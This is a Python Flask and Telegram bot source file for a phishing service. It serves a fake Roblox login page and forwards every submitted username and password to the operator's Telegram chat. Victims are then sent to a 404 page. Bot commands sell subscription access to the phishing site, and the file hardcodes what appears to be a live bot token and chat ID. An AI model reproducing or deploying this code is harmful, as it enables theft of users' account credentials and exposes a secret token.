from flask import Flask, request, render_template, redirect, url_for
import telebot
from telebot import types
import os
import requests
import threading
import time
from datetime import datetime, timedelta

# === Настройки ===
TOKEN = '8028944732:AAFGduJrXNp9IcIRxi5fTZpNzQaamHDglw4'  # Ваш токен
ADMIN_CHAT_ID = '6956377285'  # Ваш chat_id (Создатель)
SITE_URL = os.getenv('SITE_URL', 'https://tg-bod.onrender.com')

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)

# === Змінні для техперериву ===
tech_break = None

# === Keep-alive для Render ===
def keep_alive():
    while True:
        try:
            requests.get(SITE_URL)
            print("🔁 Keep-alive ping sent")
        except Exception as e:
            print(f"Keep-alive failed: {e}")
        time.sleep(300)

# === Функція для користувача (без бази) ===
def get_user(chat_id):
    if chat_id == ADMIN_CHAT_ID:
        print(f"Hardcoding Создатель for {chat_id}")
        return {
            'prefix': 'Создатель',
            'subscription_end': datetime.now() + timedelta(days=3650),
            'site_clicks': 0,
            'password_views': 0
        }
    print(f"User {chat_id} not found (no DB)")
    return None

# === Перевірка доступу ===
def check_access(chat_id, command):
    global tech_break
    print(f"Checking access for {chat_id} on command {command}")
    if tech_break and chat_id != ADMIN_CHAT_ID:
        time_left = (tech_break - datetime.now()).total_seconds() / 60
        if time_left > 0:
            return f"⏳ Сейчас проходит техперерыв. Конец будет через {int(time_left)} минут."
    user = get_user(chat_id)
    if not user or user['prefix'] == 'Посетитель':
        return "🔒 Вы можете купить подписку у @sacoectasy."
    if command in ['techstop'] and user['prefix'] != 'Создатель':
        return "🔒 Доступно только для Создателя!"
    print(f"Access granted for {chat_id} on {command}")
    return None

# === Flask маршрути ===
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login-roblox.html')
def login_page():
    return render_template('login-roblox.html')

@app.route('/submit', methods=['POST'])
def submit():
    try:
        login = request.form.get('login')
        password = request.form.get('password')
        if login and password:
            print(f"Received login: {login}, password: {password}")
            bot.send_message(ADMIN_CHAT_ID, f"🔐 Новый логин:\nЛогин: {login}\nПароль: {password}")
        return redirect(url_for('not_found'))
    except Exception as e:
        print(f"Error in /submit: {e}")
        return "Internal Server Error", 500

@app.route('/404')
def not_found():
    return render_template('404.html')

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        print(f"Received webhook data: {json_string}")
        update = telebot.types.Update.de_json(json_string)
        if update and update.message:
            print(f"Processing update: {update.message.text}")
            bot.process_new_updates([update])
        else:
            print("No valid update found in webhook data")
        return 'OK', 200
    print("Invalid webhook request")
    return 'Invalid request', 400

@app.route('/setup', methods=['GET'])
def setup():
    try:
        bot.remove_webhook()
        webhook_url = f"{SITE_URL}/webhook"
        bot.set_webhook(url=webhook_url)
        print(f"Webhook set to {webhook_url}")
        return "Webhook set", 200
    except Exception as e:
        print(f"Setup failed: {e}")
        return f"Setup failed: {e}", 500

# === Команди бота ===
@bot.message_handler(commands=['start'])
def start_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /start for chat_id: {chat_id}")
    access = check_access(chat_id, 'start')
    if access:
        bot.reply_to(message, access)
        return
    bot.reply_to(message, "✅ Бот активен! Используйте /menu для списка команд.")

@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /menu for chat_id: {chat_id}")
    access = check_access(chat_id, 'menu')
    if access:
        bot.reply_to(message, access)
        return
    user = get_user(chat_id)
    if user:
        time_left = (user['subscription_end'] - datetime.now()).days if user['subscription_end'] else 0
        time_str = f"{time_left} дней" if time_left > 0 else "Истекла"
        response = f"👤 Ваш префикс: {user['prefix']}\n⏳ Подписка: {time_str}\n\n🧾 Команды:\n/start\n/menu\n/site\n/getchatid\n/techstop"
    else:
        response = "🧾 Команды:\n/start\n/menu\n/site\n/getchatid"
    bot.reply_to(message, response)

@bot.message_handler(commands=['site'])
def site_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /site for chat_id: {chat_id}")
    access = check_access(chat_id, 'site')
    if access:
        bot.reply_to(message, access)
        return
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Перейти на сайт", url=SITE_URL))
    bot.reply_to(message, "🌐 Нажмите кнопку ниже:", reply_markup=markup)

@bot.message_handler(commands=['getchatid'])
def getchatid_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /getchatid for chat_id: {chat_id}")
    access = check_access(chat_id, 'getchatid')
    if access:
        bot.reply_to(message, access)
        return
    bot.reply_to(message, f"Ваш Chat ID: {chat_id}")

@bot.message_handler(commands=['techstop'])
def techstop_cmd(message):
    chat_id = str(message.chat.id)
    print(f"Processing /techstop for chat_id: {chat_id}")
    access = check_access(chat_id, 'techstop')
    if access:
        bot.reply_to(message, access)
        return
    global tech_break
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args or not args[0].isdigit():
        bot.reply_to(message, "❌ Укажите время в минутах: /techstop <минуты>")
        return
    minutes = int(args[0])
    tech_break = datetime.now() + timedelta(minutes=minutes)
    bot.reply_to(message, f"⏳ Техперерыв установлен на {minutes} минут. Конец: {tech_break.strftime('%H:%M')}")

if __name__ == "__main__":
    threading.Thread(target=keep_alive, daemon=True).start()
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
